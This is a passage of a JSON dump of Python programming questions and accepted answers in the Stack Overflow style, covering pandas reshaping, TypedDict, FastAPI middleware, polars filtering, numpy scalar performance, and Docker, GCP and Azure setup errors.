seems like nothing really happened and the algorithm just finished prematurely?!!\nNow look at the message above (see \ud83d\udca1). If we run a google search on this, you could find something like this:\n\nSummary\n\nb'CONVERGENCE: NORM_OF_PROJECTED_GRADIENT_\nIf the loss-landscape does not have a smoothely changing topography, the gradient descent algorithms will soon find that from one iteration to the next, there isn't much change happening and hence, will terminate further seeking. Also, if the loss-landscape is rather flat, this could see similar fate and get early-termination.\n\n\nscipy-optimize-minimize does not perform the optimization - CONVERGENCE: NORM_OF_PROJECTED_GRADIENT_\n\n\n\nD. Making the Loss Landscape Smoother\nA binary evaluation of value = 1 if x>5 else 0 is essentially a step-function that assigns 1 for all values of x that are greater than 5 and 0 otherwise. But this introduces a kink - a discontinuity in smoothness and this could potentially introduce problems in traversing the loss-landscape.\nWhat if we use a sigmoid function to introduce some smoothness?\n\n\n\n\n# Define sigmoid function\ndef sigmoid(x):\n    \"\"\"Sigmoid function.\"\"\"\n    return 1 / (1 + np.exp(-x))\n\nFor the above example, we could modify it as follows.\n\n\n\n\nYou can additionally introduce another factor (gamma: \u03b3) as follows and try to optimize it to make the landscape smoother. Thus by controlling the gamma factor, you could make the function smoother and change how quickly it changes around x = 5\n\n\n\n\n\nThe above figure is created with the following code-snippet.\nimport matplotlib.pyplot as plt\n\n%matplotlib inline \n%config InlineBackend.figure_format = 'svg' # 'svg', 'retina' \nplt.style.use('seaborn-white')\n\ndef make_figure(figtitle: str=\"Sigmoid Function\"):\n    \"\"\"Make the demo figure for using sigmoid.\"\"\"\n\n    x = np.arange(-20, 20.01, 0.01)\n    y1 = sigmoid(x)\n    y2 = sigmoid(x - 5)\n    y3 = sigmoid((x - 5)/3)\n    y4 = sigmoid((x - 5)/0.3)\n    fig, ax = plt.subplots(figsize=(10,5))\n    plt.sca(ax)\n    plt.plot(x, y1, ls=\"-\", label=\"$\\sigma(x)$\")\n    plt.plot(x, y2, ls=\"--\", label=\"$\\sigma(x - 5)$\")\n    plt.plot(x, y3, ls=\"-.\", label=\"$\\sigma((x - 5) / 3)$\")\n    plt.plot(x, y4, ls=\":\", label=\"$\\sigma((x - 5) / 0.3)$\")\n    plt.axvline(x=0, ls=\"-\", lw=1.3, color=\"cyan\", alpha=0.9)\n    plt.axvline(x=5, ls=\"-\", lw=1.3, color=\"magenta\", alpha=0.9)\n    plt.legend()\n    plt.title(figtitle)\n    plt.show()\n\nmake_figure()\n\nD.1. Example of Metric Smoothing\nThe following is an example of how you could apply function smoothing.\nfrom functools import partial\n\ndef sig(x, gamma: float=1.):\n    return sigmoid(x/gamma)\n\ndef myFunc3(params, gamma: float=0.5):\n    \"\"\"myFunc metric v3 with smoother metric.\"\"\"\n    (ev, bv, vc, dv) = params\n    _sig = partial(sig, gamma=gamma)\n    df['Number'] = _sig(x = -(df['Dividend2'] - vc)) * 1 \\\n                    + _sig(x = -(df['EV2'] - dv)) * 1\n    df['Return'] = (\n        _sig(x = df['EV'] - ev) \n        * _sig(x = -(df['Probability'] - bv))\n        * _sig(x = df['Number'] * df['Dividend'] - (vc + dv))\n    )\n    return -1 * (df['Return'].sum())\n\n"
}
{
    "Id": 72871480,
    "PostTypeId": 1,
    "Title": "When should a static method be a function?",
    "Body": "I am writing a class for an image processing algorithm which has some methods, and notably a few static methods. My IDE keeps telling me to convert static methods to function which leads me to the following question:\nWhen should a static method be turned into a function? When shouldn't it?\n",
    "AcceptedAnswerId": 73039365,
    "AcceptedAnswer": "There are no set rules in python regarding this decision, but there are style-guides defined e.g. by companies that look to solve the ambiguity of when to use what. One popular example of this would be the Google Python Style Guide:\n\nNever use staticmethod unless forced to in order to integrate with an API defined in an existing library. Write a module level function instead.\n\nMy guess is, that your IDE follows this stance of a hard no against the staticmethod. If you decide, that you still want to use staticmethods, you can try to disable the warning by adding # noqa as a comment on the line where the warning is shown. Or you can look in your IDE for a setting to disable this kind of warning globally.\nBut this is only one opinion. There are some, that do see value in using staticmethods (staticmethod considered beneficial, Why Python Developers Should Use @staticmethod and @classmethod), and there are others that argue against the usage of staticmethods (Thoughts On @staticmethod Usage In Python, @staticmethod considered a code smell)\nAnother quote that is often cited in this discussion is from Guido van Rossum (creator of Python):\n\nHonestly, staticmethod was something of a mistake -- I was trying to\ndo something like Java class methods but once it was released I found\nwhat was really needed was classmethod. But it was too late to get rid\nof staticmethod.\n\n\nI have compiled a list of arguments that I found, without any evaluation or order.\nPro module-level function:\n\nStaticmethod lowers the cohesion of the class it is in as it is not using any of the attributes the class provides.\n\nTo call the staticmethod any other module needs to import the whole class even if you just want to use that one method.\n\nStaticmethod binds the method to the namespace of the class which makes it longer to write SomeWhatDescriptiveClassName.method instead of method and more work to refactor code if you change the class.\n\nEasier reuse of method in other classes or contexts.\n\nThe call signature of a staticmethod is the same as that of a classmethod or instancemethod. This masks the fact that the staticmethod does not actually read or modify any object information especially when being called from an instance. A module-level function makes this explicit.\n\n\nPro staticmethod:\n\nBeing bound by an API your class has to work in, it can be the only valid option.\n\nPossible usage of polymorphism for the method. Can overwrite the staticmethod in a subclass to change behaviour.\n\nGrouping a method directly to a class it is meant to be used with.\n\nEasier to refactor between classmethod, instancemethod and staticmethod compared to module-level functions.\n\nHaving the method under the namespace of the class can help with reducing possible namespace-collisions inside your module and reducing the namespace of your module overall.\n\n\nAs I see it, there are no strong arguments for or against the staticmethod (except being bound by an API). So if you work in an organisation that provides a code standard to follow, just do that. Else it comes down to what helps you best to structure your code for maintainability and readability, and to convey the message of what your code is meant to do and how it is meant to be used.\n"
}
{
    "Id": 73067450,
    "PostTypeId": 1,
    "Title": "Get row values as column values",
    "Body": "I have a single row data-frame like below\nNum     TP1(USD)    TP2(USD)    TP3(USD)    VReal1(USD)     VReal2(USD)     VReal3(USD)     TiV1 (EUR)  TiV2 (EUR)  TiV3 (EUR)  TR  TR-Tag\nAA-24   0       700     2100    300     1159    2877    30       30     47      10  5\n\nI want to get a dataframe like the one below\nID  Price   Net     Range\n1   0       300     30\n2   700     1159    30\n3   2100    2877    47\n\nThe logic here is that\na. there will be 3 columns names that contain TP/VR/TV. So in the ID, we have 1, 2 & 3 (these can be generated by extracting the value from the column names or just by using a range to fill)\nb. TP1 value goes into first row of column 'Price',TP2 value goes into second row of column 'Price' & so on\nc. Same for VR & TV. The values go into 'Net' & 'Range columns\nd. Columns 'Num', 'TR'  & 'TR=Tag' are not relevant for the result.\nI tried df.filter(regex='TP').stack(). I get all the 'TP' column & I can access individual values be index ([0],[1],[2]). I could not get all of them into a column directly.\nI also wondered if there may be a easier way of doing this.\n",
    "AcceptedAnswerId": 73067635,
    "AcceptedAnswer": "Assuming 'Num' is a unique identifier, you can use pandas.wide_to_long:\npd.wide_to_long(df, stubnames=['TP', 'VR', 'TV'], i='Num', j='ID')\n\nor, for an output closer to yours:\nout = (pd\n .wide_to_long(df, stubnames=['TP', 'VR', 'TV'], i='Num', j='ID')\n .reset_index('ID')\n .drop(columns=['TR', 'TR-Tag'])\n .rename(columns={'TP': 'Price', 'VR': 'Net', 'TV': 'Range'})\n )\n\noutput:\n       ID  Price   Net  Range\nNum                          \nAA-24   1      0   300     30\nAA-24   2    700  1159     30\nAA-24   3   2100  2877     47\n\nupdated answer\nout = (pd\n .wide_to_long(df.set_axis(df.columns.str.replace(r'\\(USD\\)$', '', regex=True),\n                           axis=1),\n               stubnames=['TP', 'VReal', 'TiV'], i='Num', j='ID')\n .reset_index('ID')\n .drop(columns=['TR', 'TR-Tag'])\n .rename(columns={'TP': 'Price', 'VReal': 'Net', 'TiV': 'Range'})\n )\n\noutput:\n       ID  Price   Net  Range\nNum                          \nAA-24   1      0   300     30\nAA-24   2    700  1159     30\nAA-24   3   2100  2877     47\n\n"
}
{
    "Id": 71802758,
    "PostTypeId": 1,
    "Title": "When using slots, why does dir(type) have no __dict__ attribute?",
    "Body": "I'm trying to understand slots. Therefore, I have written a little script with two classes, one using slots and one not.\nclass A:\n    def __init__(self, name):\n        self.name = name\n\n    def getName(self):\n        return self.name\n\nclass C:\n    __slots__ = \"name\"\n\n    def __init__(self, name):\n        self.name = name\n\n    def getName(self):\n        return self.name\n\nWhen I use the dir() on type A and on an object of type A, the attribute __dict__ appears in the result list, as expected.\ndir(A)\n['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'getName']\n\ndir(A(\"test\"))\n['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'getName', 'name']\n\nIf I use type C I get\nprint(dir(C))\n['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__slots__', '__str__', '__subclasshook__', 'classAttributeC', 'getName', 'name']\n\nprint(dir(C(\"test\")))\n['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__slots__', '__str__', '__subclasshook__', 'classAttributeC', 'getName', 'name']\n\nNo attribute __dict__ in the results list for dir(C(\"test\")), as expected but also no attribute __dict__ for dir(C).\nWhy isn't the attribute in the results list when I can call C.__dict__ and get the following output?\n{'__module__': '__main__', 'classAttributeC': 9999, '__slots__': 'name', '__init__': , 'getName': , 'name': , '__doc__': None}\n\n",
    "AcceptedAnswerId": 71803126,
    "AcceptedAnswer": "Since you don't override __dir__ here, in each case here it will resolve in the MRO to type.__dir__(A) or type.__dir__(C). So we look at the default implementation of __dir__ for types, here in Objects/typeobject.c\n/* __dir__ for type objects: returns __dict__ and __bases__.\n   We deliberately don't suck up its __class__, as methods belonging to the\n   metaclass would probably be more confusing than helpful.\n*/\nstatic PyObject *\ntype___dir___impl(PyTypeObject *self)\n{\n    PyObject *result = NULL;\n    PyObject *dict = PyDict_New();\n\n    if (dict != NULL && merge_class_dict(dict, (PyObject *)self) == 0)\n        result = PyDict_Keys(dict);\n\n    Py_XDECREF(dict);\n    return result;\n}\n\nThe bases are the same (object,), so there is your answer in the __dict__:\n>>> \"__dict__\" in A.__dict__\nTrue\n>>> \"__dict__\" in C.__dict__\nFalse\n\nSo, types without slots implement a __dict__ descriptor, but types which implement slots don't - and you just get a __dict__ implementation from above:\n>>> inspect.getattr_static(A, \"__dict__\")\n\n>>> inspect.getattr_static(C, \"__dict__\")\n\n\n"
}
{
    "Id": 71814658,
    "PostTypeId": 1,
    "Title": "Python typing: Does TypedDict allow additional / extra keys?",
    "Body": "Does typing.TypedDict allow extra keys? Does a value pass the typechecker, if it has keys which are not present on the definition of the TypedDict?\n",
    "AcceptedAnswerId": 71814659,
    "AcceptedAnswer": "It depends.\nPEP-589, the specification of TypedDict, explicitely forbids extra keys:\n\nExtra keys included in TypedDict object construction should also be caught. In this example, the director key is not defined in Movie and is expected to generate an error from a type checker:\nm: Movie = dict(\n      name='Alien',\n      year=1979,\n      director='Ridley Scott')  # error: Unexpected key 'director'\n\n\n[highlighting by me]\nThe typecheckers mypy, pyre, pyright implement this according to the specification.\nHowever, it is possible that a value with extra keys is accepted. This is because subtyping of TypedDicts is allowed, and the subtype might implement the extra key. PEP-589 only forbids extra keys in object construction, i.e. in literal assignment. As any value that complies with a subtype is always deemed to comply with the parent type and can be upcasted from the subtype to the parent type, an extra key can be introduced through a subtype:\nfrom typing import TypedDict\n\nclass Movie(TypedDict):\n    name: str\n    year: int\n\nclass MovieWithDirector(Movie):\n    director: str\n\n\n# This is illegal:\nmovie: Movie = {\n    'name': 'Ash is purest white', \n    'year': 2018, \n    'director': 'Jia Zhangke',\n}    \n\n# This is legal:\nmovie_with_director: MovieWithDirector = {\n    'name': 'Ash is purest white', \n    'year': 2018, \n    'director': 'Jia Zhangke',\n}\n\n# This is legal, MovieWithDirector is a subtype of Movie\nmovie: Movie = movie_with_director  \n\nIn the example above, we see that the same value can sometimes be considered complying with Movie by the typing system, and sometimes not.\nAs a consequence of subtyping, typing a parameter as a certain TypedDict is not a safeguard against extra keys, because they could have been introduced through a subtype.\nIf your code is sensitive with regard to the presence of extra keys (for instance, if it makes use of param.keys(), param.values() or len(param) on the TypedDict parameter param), this could lead to problems when extra keys are present. A solution to this problem is to either handle the exceptional case that extra keys are actually present on the parameter or to make your code insensitive against extra keys.\nIf you want to test that your code is robust against extra keys, you cannot simply add a key in the test value:\ndef some_movie_function(movie: Movie):\n    # ...\n\ndef test_some_movie_function():\n    # this will not be accepted by the type checker:\n    result = some_movie_function({\n        'name': 'Ash is purest white', \n        'year': 2018, \n        'director': 'Jia Zhangke',\n        'genre': 'drama',\n    })    \n\nWorkarounds are to either make the type checkers ignore the line or to create a subtype for your test, introducing the extra keys only for your test:\nclass ExtendedMovie(Movie):\n     director: str\n     genre: str\n\n\ndef test_some_movie_function():\n    extended_movie: ExtendedMovie = {\n        'name': 'Ash is purest white', \n        'year': 2018, \n        'director': 'Jia Zhangke',\n        'genre': 'drama',\n    }\n\n    result = some_movie_function(test_some_movie_function)\n    # run assertions against result\n} \n\n"
}
{
    "Id": 72373093,
    "PostTypeId": 1,
    "Title": "How to define \"python_requires\" in pyproject.toml using setuptools?",
    "Body": "Setuptools allows you to specify the minimum python version as such:\nfrom setuptools import setup\n\n[...]\n\nsetup(name=\"my_package_name\",\n      python_requires='>3.5.2',\n      [...]\n\n\nHowever, how can you do this with the pyproject.toml? The following two things did NOT work:\n[project]\n...\n# ERROR: invalid key \npython_requires = \">=3\"\n\n# ERROR: no matching distribution found\ndependencies = [\"python>=3\"]\n\n",
    "AcceptedAnswerId": 72462723,
    "AcceptedAnswer": "According to PEP 621, the equivalent field in the [project] table is requires-python.\nMore information about the list of valid configuration fields can be found in: https://packaging.python.org/en/latest/specifications/declaring-project-metadata/.\nThe equivalent pyproject.toml of your example would be:\n[project]\nname = \"my_package_name\"\nrequires-python = \">3.5.2\"\n...\n\n"
}
{
    "Id": 71850031,
    "PostTypeId": 1,
    "Title": "Py Polars: How to filter using 'in' and 'not in' like in SQL",
    "Body": "How can I achieve the equivalents of SQL's IN and NOT IN?\nI have a list with the required values. Here's the scenario:\nimport pandas as pd\nimport polars as pl\nexclude_fruit = [\"apple\", \"orange\"]\n\ndf = pl.DataFrame(\n    {\n        \"A\": [1, 2, 3, 4, 5, 6],\n        \"fruits\": [\"banana\", \"banana\", \"apple\", \"apple\", \"banana\", \"orange\"],\n        \"B\": [5, 4, 3, 2, 1, 6],\n        \"cars\": [\"beetle\", \"audi\", \"beetle\", \"beetle\", \"beetle\", \"frog\"],\n        \"optional\": [28, 300, None, 2, -30, 949],\n    }\n)\ndf.filter(~pl.select(\"fruits\").str.contains(exclude_fruit))\ndf.filter(~pl.select(\"fruits\").to_pandas().isin(exclude_fruit))\ndf.filter(~pl.select(\"fruits\").isin(exclude_fruit))\n\n",
    "AcceptedAnswerId": 71850319,
    "AcceptedAnswer": "You were close.\ndf.filter(~pl.col('fruits').is_in(exclude_fruit))\n\nshape: (3, 5)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 A   \u2506 fruits \u2506 B   \u2506 cars   \u2506 optional \u2502\n\u2502 --- \u2506 ---    \u2506 --- \u2506 ---    \u2506 ---      \u2502\n\u2502 i64 \u2506 str    \u2506 i64 \u2506 str    \u2506 i64      \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 1   \u2506 banana \u2506 5   \u2506 beetle \u2506 28       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 banana \u2506 4   \u2506 audi   \u2506 300      \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 5   \u2506 banana \u2506 1   \u2506 beetle \u2506 -30      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n"
}
{
    "Id": 71858905,
    "PostTypeId": 1,
    "Title": "Does urllib3 support HTTP/2 Requests? Will it?",
    "Body": "I know the following about various python HTTP libraries:\n\nRequests does not support HTTP/2 requests.\nHyper does support HTTP/2 requests, but is archived as of early 2021 and wouldn't be a good choice for new projects.\nHTTPX does support HTTP/2, but this support is optional, requires installing extra dependencies, and comes with some caveats about rough edges.\nAIOHTTP does not support HTTP2 yet (as of mid April 2022).\n\nThe focus of this project is also not solely on being a client -- this package also includes a server.\n\n\n\nThe other major HTTP request library I'm aware of is urllib3. This is what OpenAPI Generator uses by default when generating python client libraries.\nMy Questions are:\nCan urrlib3 be configured to make HTTP/2 requests?\nI cannot find any information on http2 support in the documentation, and through my testing of a generated OpenAPI client, all requests are HTTP/1.1. If the answer is no currently, are the maintainers planning HTTP/2 support? I cannot find any evidence of this in the project's open issues.\n",
    "AcceptedAnswerId": 71874365,
    "AcceptedAnswer": "I asked about this in the urllib3 discord, and got an answer from one of the maintainers that corroborates what Tim Roberts commented;\n\nProper HTTP/2 implementations require async/await to take advantage of the main different feature in HTTP/2, which is making requests in parallel.\nurllib3 in particular is not planning to support this because it'll in general require a rewrite.\n\n"
}
{
    "Id": 73062386,
    "PostTypeId": 1,
    "Title": "Adding single integer to numpy array faster if single integer has python-native int type",
    "Body": "I add a single integer to an array of integers with 1000 elements. This is faster by 25% when I first cast the single integer from numpy.int64 to the python-native int.\nWhy? Should I, as a general rule of thumb convert the single number to native python formats for single-number-to-array operations with arrays of about this size?\nNote: may be related to my previous question Conjugating a complex number much faster if number has python-native complex type.\nimport numpy as np\n\nnnu = 10418\nnnu_use = 5210\na = np.random.randint(nnu,size=1000)\nb = np.random.randint(nnu_use,size=1)[0]\n\n%timeit a + b                            # --> 3.9 \u00b5s \u00b1 19.9 ns per loop (mean \u00b1 std. dev. of 7 runs, 100000 loops each)\n%timeit a + int(b)                       # --> 2.87 \u00b5s \u00b1 8.07 ns per loop (mean \u00b1 std. dev. of 7 runs, 100000 loops each)\n\n\nNote that the speed-up can be enormous (factor 50) for scalar-to-scalar-operations as well, as seen below:\nnp.random.seed(100)\n\na = (np.random.rand(1))[0]\na_native = float(a)\nb = complex(np.random.rand(1)+1j*np.random.rand(1))\nc = (np.random.rand(1)+1j*np.random.rand(1))[0]\nc_native = complex(c)\n\n%timeit a * (b - b.conjugate() * c)                # 6.48 \u00b5s \u00b1 49.7 ns per loop (mean \u00b1 std. dev. of 7 runs, 100000 loops each)\n%timeit a_native * (b - b.conjugate() * c_native)  # 283 ns \u00b1 7.78 ns per loop (mean \u00b1 std. dev. of 7 runs, 1000000 loops each)\n%timeit a * b                                      # 5.07 \u00b5s \u00b1 17.7 ns per loop (mean \u00b1 std. dev. of 7 runs, 100000 loops each)\n%timeit a_native * b                               # 94.5 ns \u00b1 0.868 ns per loop (mean \u00b1 std. dev. of 7 runs, 10000000 loops each)\n\n\nUpdate: Could it be that the latest numpy release fixes the speed difference? The release notes of numpy 1.23 mention that scalar operations are now much faster, see https://numpy.org/devdocs/release/1.23.0-notes.html#performance-improvements-and-changes and https://github.com/numpy/numpy/pull/21188. I am using python 3.7.6, numpy 1.21.2.\n",
    "AcceptedAnswerId": 73070306,
    "AcceptedAnswer": "On my Windows PC with CPython 3.8.1, I get:\n[Old] Numpy 1.22.4:\n - First test: 1.65 \u00b5s VS 1.43 \u00b5s\n - Second:     2.03 \u00b5s VS 0.17 \u00b5s\n\n[New] Numpy 1.23.1:\n - First test: 1.38 \u00b5s VS 1.24 \u00b5s    <----  A bit better than Numpy 1.22.4\n - Second:     0.38 \u00b5s VS 0.17 \u00b5s    <----  Much better than Numpy 1.22.4\n\n\nWhile the new version of Numpy gives a good boost, native type should always be faster than Numpy ones with the (default) CPython interpreter. Indeed, the interpreter needs to call C function of Numpy. This is not needed with native types. Additionally, the Numpy checks and wrapping is not optimal but Numpy is not designed for fast scalar computation in the first place (though the overhead was previously not reasonable). In fact, scalar computations are very inefficient and the interpreter prevent any fast execution.\nIf you plan to do many scalar operation you need to use a natively compiled code, possibly using Cython, Numba, or even a raw C/C++ module. Note that Cython do not optimize/inline Numpy calls but can operate on native types faster. A native code can do this certainly in one or even two order of magnitude less time.\nNote that in the first case, the path in Numpy functions is not the same and Numpy does additional check that are a bit more expensive then the value is not a CPython object. Still, it should be a constant overhead (and now relatively small). Otherwise, it would be a bug (and should be reported).\nRelated: Why is np.sum(range(N)) very slow?\n"
}
{
    "Id": 72251787,
    "PostTypeId": 1,
    "Title": "Permission \"artifactregistry.repositories.downloadArtifacts\" denied on resource",
    "Body": "While the artifact repository was successfully creating, running a docker push to push the image to the google artifact registry fails with a permissions error even after granting all artifact permissions to the accounting I am using on gcloud cli.\nCommand used to push image:\ndocker push us-central1-docker.pkg.dev/project-id/repo-name:v2\n\nError message:\nThe push refers to repository [us-central1-docker.pkg.dev/project-id/repo-name]\n6f6f4a472f31: Preparing\nbc096d7549c4: Preparing\n5f70bf18a086: Preparing\n20bed28d4def: Preparing\n2a3255c6d9fb: Preparing\n3f5d38b4936d: Waiting\n7be8268e2fb0: Waiting\nb889a93a79dd: Waiting\n9d4550089a93: Waiting\na7934564e6b9: Waiting\n1b7cceb6a07c: Waiting\nb274e8788e0c: Waiting\n78658088978a: Waiting\ndenied: Permission \"artifactregistry.repositories.downloadArtifacts\" denied on resource \"projects/project-id/locations/us-central1/repositories/repo-name\" (or it may not exist)\n\n\n\n",
    "AcceptedAnswerId": 72255017,
    "AcceptedAnswer": "I was able to recreate your use case. This happens when you are trying to push an image on a repository in which its specific hostname (associated with it's repository location) is not yet  added to the credential helper configuration for authentication. You may refer to this Setting up authentication for Docker  as also provided by @DazWilkin in the comments for more details.\nIn my example, I was trying to push an image on a repository that has a location of us-east1 and got the same error since it is not yet added to the credential helper configuration.\n\nAnd after I ran the authentication using below command (specifically for us-east1 since it is the location of my repository), the image was successfully pushed:\ngcloud auth configure-docker us-east1-docker.pkg.dev\n\n\nQUICK TIP: You may  get your authentication command specific for your repository when you open your desired repository in the console, and then click on the SETUP INSTRUCTIONS.\n\n"
}
{
    "Id": 71187944,
    "PostTypeId": 1,
    "Title": "dlopen: libcrypt.so.1: cannot open shared object file: No such file or directory",
    "Body": "I use EndeavourOS and have updated my system on February 17 2022 using\nsudo pacman -Syu\n\nEversince, when I run docker-compose, I get this error message:\n\n[4221] Error loading Python lib '/tmp/_MEIgGJQGW/libpython3.7m.so.1.0': dlopen: libcrypt.so.1: cannot open shared object file: No such file or directory\n\nSome forum threads suggested to reinstall docker-compose, which I did. I tried the following solution, but both without success:\nPython3.7: error while loading shared libraries: libpython3.7m.so.1.0\nHow can I resolve this issue?\n",
    "AcceptedAnswerId": 72563653,
    "AcceptedAnswer": "The underlying issue here is that you use docker-compose instead of docker compose, which are two different binaries. docker-compose is also known as V1, and is deprecated since April 26, 2022. Since then, it does not receive updates or patches, other than high-severity security patches.\nSo, to fix your issue, use docker compose instead of docker-compose. If you compare docker compose version and docker-compose version, you will see that this uses the newer docker compose and runs without an issue.\n"
}
{
    "Id": 71882419,
    "PostTypeId": 1,
    "Title": "FastAPI - How to get the response body in Middleware",
    "Body": "Is there any way to get the response content in a middleware?\nThe following code is a copy from here.\n@app.middleware(\"http\")\nasync def add_process_time_header(request: Request, call_next):\n    start_time = time.time()\n\n    response = await call_next(request)\n\n    process_time = time.time() - start_time\n    response.headers[\"X-Process-Time\"] = str(process_time)\n    return response\n\n",
    "AcceptedAnswerId": 71883126,
    "AcceptedAnswer": "The response body is an iterator, which once it has been iterated through, it cannot be re-iterated again. Thus, you either have to save all the iterated data to a list (or bytes variable) and use that to return a custom Response, or initiate the iterator again. The options below demonstrate both approaches. In case you would like to get the request body inside the middleware as well, please have a look at this answer.\nOption 1\nSave the data to a list and use iterate_in_threadpool to initiate the iterator again, as described here - which is what StreamingResponse uses, as shown here.\nfrom starlette.concurrency import iterate_in_threadpool\n\n@app.middleware(\"http\")\nasync def some_middleware(request: Request, call_next):\n    response = await call_next(request)\n    response_body = [chunk async for chunk in response.body_iterator]\n    response.body_iterator = iterate_in_threadpool(iter(response_body))\n    print(f\"response_body={response_body[0].decode()}\")\n    return response\n\nNote 1: If your code uses StreamingResponse, response_body[0] would return only the first chunk of the response. To get the entire response body, you should join that list of bytes (chunks), as shown below (.decode() returns a string representation of the bytes object):\nprint(f\"response_body={(b''.join(response_body)).decode()}\")\n\nNote 2: If you have a StreamingResponse streaming a body that wouldn't fit into your server's RAM (for example, a response of 30GB), you may run into memory errors when iterating over the response.body_iterator (this applies to both options listed in this answer), unless you loop through response.body_iterator (as shown in Option 2), but instead of storing the chunks in an in-memory variable, you store it somewhere on the disk. However, you would then need to retrieve the entire response data from that disk location and load it into RAM, in order to send it back to the client (which could extend the delay in responding to the client even more)\u2014in that case, you could load the contents into RAM in chunks and use StreamingResponse, similar to what has been demonstrated here, here, as well as here, here and here (in Option 1, you can just pass your iterator/generator function to iterate_in_threadpool). However, I would not suggest following that approach, but instead have such endpoints returning large streaming responses excluded from the middleware, as described in this answer.\nOption 2\nThe below demosntrates another approach, where the response body is stored in a bytes object (instead of a list, as shown above), and is used to return a custom Response directly (along with the status_code, headers and media_type of the original response).\n@app.middleware(\"http\")\nasync def some_middleware(request: Request, call_next):\n    response = await call_next(request)\n    response_body = b\"\"\n    async for chunk in response.body_iterator:\n        response_body += chunk\n    print(f\"response_body={response_body.decode()}\")\n    return Response(content=response_body, status_code=response.status_code, \n        headers=dict(response.headers), media_type=response.media_type)\n\n"
}
{
    "Id": 73072257,
    "PostTypeId": 1,
    "Title": "Resolve warning \"A NumPy version >=1.16.5 and <1.23.0 is required for this version of SciPy\"?",
    "Body": "When I import SciPy or a library dependent on it, I receive the following warning message:\nUserWarning: A NumPy version >=1.16.5 and <1.23.0 is required for this version of SciPy (detected version 1.23.1\n\nIt's true that I am running NumPy version 1.23.1, however this message is a mystery to me since I am running SciPy version 1.7.3, which, according to SciPy's documentation, is compatible with NumPy \nAnyone having this problem or know how to resolve it?\nI am using Conda as an environment manager, and all my packages are up to date as far as I know.\n\npython: 3.9.12\nnumpy: 1.23.1\nscipy: 1.7.3\n\nThanks in advance if anyone has any clues !\n",
    "AcceptedAnswerId": 73072455,
    "AcceptedAnswer": "According to the setup.py file of the scipy 1.7.3, numpy is indeed . As @Libra said, the docs must be incorrect. You can:\n\nIgnore this warning\nUse scipy 1.8\nUse numpy \n\nEdit:\nThis is now fixed in the dev docs of scipy https://scipy.github.io/devdocs/dev/toolchain.html\n"
}
{
    "Id": 72258087,
    "PostTypeId": 1,
    "Title": "unexpected keyword argument 'tenant_id' while accessing Azure Key Vault in Python",
    "Body": "I was trying to accessing my key vault, but I got always the same error:\nAppServiceCredential.get_token failed: request() got an unexpected keyword argument 'tenant_id'\nManagedIdentityCredential.get_token failed: request() got an unexpected keyword argument 'tenant_id'\n\nThis was the code I used in an Azure Machine Learning notebook, copied from the docs:\nfrom azure.identity import ManagedIdentityCredential\nfrom azure.keyvault.secrets import SecretClient\n\ncredential = ManagedIdentityCredential()\nsecret_client = SecretClient(vault_url=\"https://XXXX.vault.azure.net/\", credential=credential)\n\nsecretName = 'test'\nretrieved_secret = secret_client.get_secret(secretName) # here's the error\nretrieved_secret\n\nWhat is wrong? Could you help me?\nThank you in advance.\n",
    "AcceptedAnswerId": 72262694,
    "AcceptedAnswer": "This error is because of a bug that has since been fixed in azure-identity's ManagedIdentityCredential. Key Vault clients in recent packages include a tenant ID in token requests to support cross-tenant authentication, but some azure-identity credentials didn't correctly handle this keyword argument until the bug was fixed in version 1.8.0. Installing azure-identity>=1.8.0 should fix the error you're getting.\n(Disclaimer: I work for the Azure SDK for Python)\n"
}
{
    "Id": 71925980,
    "PostTypeId": 1,
    "Title": "cannot perform operation: another operation is in progress in pytest",
